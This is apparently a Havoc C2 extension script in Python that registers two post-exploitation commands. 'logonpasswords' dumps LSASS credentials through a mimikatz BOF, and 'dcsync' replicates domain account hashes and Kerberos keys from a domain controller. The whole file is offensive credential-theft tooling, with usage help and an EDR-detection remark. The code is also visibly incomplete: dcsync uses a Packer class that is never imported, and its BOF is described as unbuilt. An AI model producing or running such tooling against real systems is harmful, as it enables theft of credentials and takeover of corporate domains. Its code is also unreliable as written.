from havoc import Demon, RegisterCommand


LOGONPASSWORDS_HELP = """logonpasswords
    Dumps credentials (msv/wdigest/kerberos/tspkg/ssp/credman) from LSASS by
    running the mimikatz sekurlsa::logonPasswords port in-line as a BOF.

Arguments:
    (none)

Notes:
    - Requires SYSTEM or an elevated token with SeDebugPrivilege. The BOF
      enables SeDebugPrivilege for the current thread on entry.
    - Uses OpenProcess + ReadProcessMemory against LSASS ("easy route");
      EDRs that hook these calls will see it.
"""

DCSYNC_HELP = """dcsync /user:<sam> [/domain:<fqdn>] [/dc:<hostname>]
    Runs the mimikatz lsadump::dcsync port in-line as a BOF and prints the
    replicated secrets (NTLM hash + kerberos AES/DES keys) for the target
    account.

Arguments:
    /user:<sam>       (required) sAMAccountName of the account to replicate
    /domain:<fqdn>    (optional) target domain; auto-discovered if omitted
    /dc:<hostname>    (optional) domain controller to bind to; discovered
                      via DsGetDcName if omitted

Notes:
    - The demon must hold a token with domain replication rights
      (Domain Admins / Get-Replication-Changes-All).
    - The dcsync BOF (bin/dcsync.x64.o) is not yet built in this tree;
      registering the command surfaces it in `help`. InlineExecute will
      error until BOF/dcsync_bof.c is written and compiled.
"""


def logonpasswords(demonID, *params):
    demon = Demon(demonID)

    if len(params) > 0:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "logonpasswords takes no arguments")
        return

    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to run sekurlsa::logonPasswords")
    demon.InlineExecute(TaskID, "go", f"bin/logonpasswords.{demon.ProcessArch}.o", b"", False)
    return TaskID


def dcsync(demonID, *params):
    demon = Demon(demonID)
    packer = Packer()

    user = ""
    domain = ""
    dc = ""

    for p in params:
        if p.startswith("/user:"):
            user = p[len("/user:"):]
        elif p.startswith("/domain:"):
            domain = p[len("/domain:"):]
        elif p.startswith("/dc:"):
            dc = p[len("/dc:"):]
        else:
            demon.ConsoleWrite(demon.CONSOLE_ERROR, f"Unknown argument: {p}")
            return

    if not user:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "/user:<sam> is required")
        return

    packer.addstr(user)
    packer.addstr(domain)
    packer.addstr(dc)

    target = f"{user}@{domain}" if domain else user
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to dcsync {target}")
    demon.InlineExecute(TaskID, "go", f"bin/dcsync.{demon.ProcessArch}.o", packer.getbuffer(), False)
    return TaskID


RegisterCommand(logonpasswords, "", "logonpasswords",
    "Dump LSASS credentials via mimikatz sekurlsa::logonPasswords (BOF)", 0,
    LOGONPASSWORDS_HELP, "logonpasswords")

RegisterCommand(dcsync, "", "dcsync",
    "Replicate an account's secrets via mimikatz lsadump::dcsync (BOF; requires build)", 0,
    DCSYNC_HELP, "dcsync /user:Administrator /domain:corp.local /dc:dc01")
